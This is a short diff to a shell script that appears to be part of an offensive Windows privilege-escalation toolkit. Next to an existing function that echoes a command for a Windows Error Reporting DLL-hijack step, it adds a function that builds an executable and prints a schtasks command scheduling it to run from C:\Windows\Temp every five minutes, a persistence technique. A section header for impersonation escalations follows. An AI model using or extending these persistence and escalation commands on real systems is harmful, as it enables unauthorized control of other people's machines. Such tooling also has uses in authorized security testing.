@@ -487,6 +487,13 @@ perform_wer_error_dll_hijack() {
     echo "schtasks /run /tn \"Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\""
 }
 
+perform_create_schtasks() {
+    create_run_windows_exe
+    exe_filename=$run_windows_filename.exe
+    echo "schtasks /create /tn \"MyTask\" /sc minute /mo 5 /tr \"C:\\Windows\\Temp\\$exe_filename\""
+
+}
+
 #=========================
 #impersonation escalations
 #=========================
